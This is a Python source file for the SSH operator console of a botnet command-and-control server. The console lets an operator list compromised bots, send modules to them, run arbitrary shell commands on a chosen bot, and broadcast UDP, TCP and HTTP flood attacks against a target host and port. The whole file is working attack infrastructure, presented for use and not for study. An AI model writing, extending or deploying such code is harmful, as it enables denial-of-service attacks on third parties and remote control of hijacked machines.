import asyncio
import logging

logger = logging.getLogger(__name__)


async def start_ssh_server(
    host: str,
    port: int,
    password: str,
    db,
    cmd_queue,
):
    """Khởi động asyncssh server tích hợp với asyncio loop."""
    try:
        import asyncssh
    except ImportError:
        logger.error("asyncssh not installed. Install with: pip install asyncssh")
        return

    from server.cli_handler import CLICommandHandler

    handler = CLICommandHandler(db, cmd_queue)

    class _SSHServer(asyncssh.SSHServer):
        def connection_made(self, conn):
            self._conn = conn

        def begin_auth(self, username):
            return True

        def password_auth_supported(self):
            return True

        def validate_password(self, username, pwd):
            return pwd == password

    async def _handle_session(stdin, stdout, stderr):
        import json

        stdout.write("CNC CLI (SSH) — type 'help' for commands, 'exit' to quit\r\n")

        while True:
            stdout.write("[CNC]> ")
            line = await stdin.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            if line.lower() in ("exit", "quit", "q"):
                break
            if line.lower() == "help":
                stdout.write(
                    "\r\n"
                    "Commands:\r\n"
                    "  bots list       List all bots\r\n"
                    "  bots count      Show bot statistics\r\n"
                    "  bot info <id>   Show bot details\r\n"
                    "  cmd <bid> <mod> [k=v ...]  Send command\r\n"
                    "  cmd status <id> Check result\r\n"
                    "  ping            Check CNC status\r\n"
                    "  help            This help\r\n"
                    "  exit            Quit\r\n"
                    "\r\n"
                )
                continue

            parts = line.split()
            cmd_name = parts[0].lower()

            if cmd_name == "bots":
                if len(parts) >= 2 and parts[1] == "count":
                    resp = await handler.handle_action("bots_count", {})
                else:
                    resp = await handler.handle_action("bots_list", {})
            elif cmd_name == "bot" and len(parts) >= 3 and parts[1] == "info":
                resp = await handler.handle_action("bot_info", {"bot_id": parts[2]})
            elif cmd_name == "cmd" and len(parts) >= 4 and parts[1] == "status":
                resp = await handler.handle_action("cmd_status", {"cmd_id": parts[2]})
            elif cmd_name == "cmd" and len(parts) >= 4:
                params = {}
                for a in parts[3:]:
                    if "=" in a:
                        k, v = a.split("=", 1)
                        params[k] = v
                    else:
                        params[f"arg{len(params)}"] = a
                resp = await handler.handle_action(
                    "cmd_send",
                    {"bot_id": parts[1], "module": parts[2], "params": params},
                )
            elif cmd_name == "ping":
                resp = await handler.handle_action("ping", {})
            elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
                if len(parts) < 3:
                    stdout.write(f"Usage: {cmd_name} <target> <port> [k=v ...]\r\n")
                    continue
                atk_type = cmd_name.split("-")[0]
                params = {"type": atk_type, "target": parts[1], "port": parts[2]}
                for extra in parts[3:]:
                    if "=" in extra:
                        k, v = extra.split("=", 1)
                        params[k] = v
                resp = await handler.handle_action(
                    "cmd_broadcast", {"module": "flood", "params": params}
                )
            elif cmd_name == "shell" and len(parts) >= 3:
                resp = await handler.handle_action(
                    "cmd_send",
                    {"bot_id": parts[1], "module": "shell", "params": {"cmd": " ".join(parts[2:])}},
                )
            else:
                stdout.write(f"Unknown: {cmd_name}. Type 'help' for commands.\r\n")
                continue

            stdout.write(json.dumps(resp) + "\r\n")

        stdout.close()

    try:
        server_key = asyncssh.generate_private_key("ssh-rsa")
        await asyncssh.listen(
            host,
            port,
            server_host_keys=[server_key],
            server_factory=lambda: _SSHServer(),
            session_factory=lambda stdin, stdout, stderr: _handle_session(
                stdin, stdout, stderr
            ),
        )
        logger.info("SSH CLI server listening on %s:%s", host, port)
        await asyncio.Event().wait()
    except asyncio.CancelledError:
        pass
    except Exception:
        logger.exception("SSH server error")
